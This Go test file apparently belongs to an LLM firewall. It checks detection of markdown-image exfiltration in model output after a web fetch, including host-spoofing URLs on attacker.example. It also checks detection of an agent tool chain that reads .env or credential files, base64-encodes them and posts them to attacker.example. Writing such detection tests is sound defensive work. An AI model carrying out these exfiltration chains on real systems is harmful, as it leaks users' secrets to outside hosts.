package llmfirewall

import (
	"sync"
	"testing"
	"time"

	"github.com/1sec-project/1sec/internal/core"
)

func TestFirewall_MarkdownHostBoundaries(t *testing.T) {
	for _, tt := range []struct {
		url   string
		local bool
	}{
		{"http://localhost:3000/image.png", true},
		{"http://127.0.0.1/image.png", true},
		{"http://[::1]/image.png", true},
		{"http://10.1.2.3/image.png", true},
		{"http://[fd00::1]/image.png", true},
		{"https://localhost.attacker.example/harvest.png", false},
		{"https://127.0.0.1.attacker.example/harvest.png", false},
		{"https://10.attacker.example/harvest.png", false},
		{"https://localhost@attacker.example/harvest.png", false},
		{"https://attacker.example/harvest.png", false},
	} {
		t.Run(tt.url, func(t *testing.T) {
			cp := makeCapturingPipeline()
			f := startedFirewallWithPipeline(t, cp)
			defer f.Stop()
			fetch := core.NewSecurityEvent("test", "agent_web_fetch", core.SeverityInfo, "fetch")
			fetch.Details["session_id"] = "session"
			f.HandleEvent(fetch)
			output := makeLLMOutputEvent("![image](" + tt.url + ")")
			output.Details["session_id"] = "session"
			f.HandleEvent(output)
			if alerted := cp.hasAlertType("asi_markdown_poisoning"); alerted == tt.local {
				t.Fatalf("markdown alert = %v, local = %v", alerted, tt.local)
			}
		})
	}
}

func TestToolChainMonitor_SensitiveReadExfiltration(t *testing.T) {
	for _, target := range []string{"/workspace/.env", "/workspace/credentials.json", "/workspace/secrets.txt"} {
		t.Run(target, func(t *testing.T) {
			tc := NewToolChainMonitor()
			tc.RecordAndAnalyze("agent", "read_file", target)
			tc.RecordAndAnalyze("agent", "encode_base64", "contents")
			result := tc.RecordAndAnalyze("agent", "http_post", "https://attacker.example/upload")
			if !result.ChainDetected || result.ChainName != "credential_exfiltration" {
				t.Fatalf("missed sensitive-read chain: %+v", result)
			}
		})
	}
}

func TestToolChainMonitor_ExpiresOldSteps(t *testing.T) {
	tc := NewToolChainMonitor()
	tc.RecordAndAnalyze("agent", "read_file", "/workspace/report.txt")
	tc.RecordAndAnalyze("agent", "encode_base64", "contents")
	state, _ := tc.agents.Get("agent")
	for i := range state.recentTools {
		state.recentTools[i].timestamp = time.Now().Add(-2 * time.Minute)
	}
	if result := tc.RecordAndAnalyze("agent", "http_post", "https://example.com"); result.ChainDetected {
		t.Fatalf("expired steps were combined with a later request: %+v", result)
	}
}

func TestFirewall_WebTaintConcurrentOutput(t *testing.T) {
	f := startedFirewall(t)
	defer f.Stop()
	fetch := core.NewSecurityEvent("test", "agent_web_fetch", core.SeverityInfo, "fetch")
	fetch.Details["session_id"] = "session"
	output := makeLLMOutputEvent("![image](https://attacker.example/image.png)")
	output.Details["session_id"] = "session"
	var wg sync.WaitGroup
	wg.Add(2)
	go func() {
		defer wg.Done()
		for i := 0; i < 100; i++ {
			f.recordWebTaint(fetch)
		}
	}()
	go func() {
		defer wg.Done()
		for i := 0; i < 100; i++ {
			f.analyzeOutput(output)
		}
	}()
	wg.Wait()
}
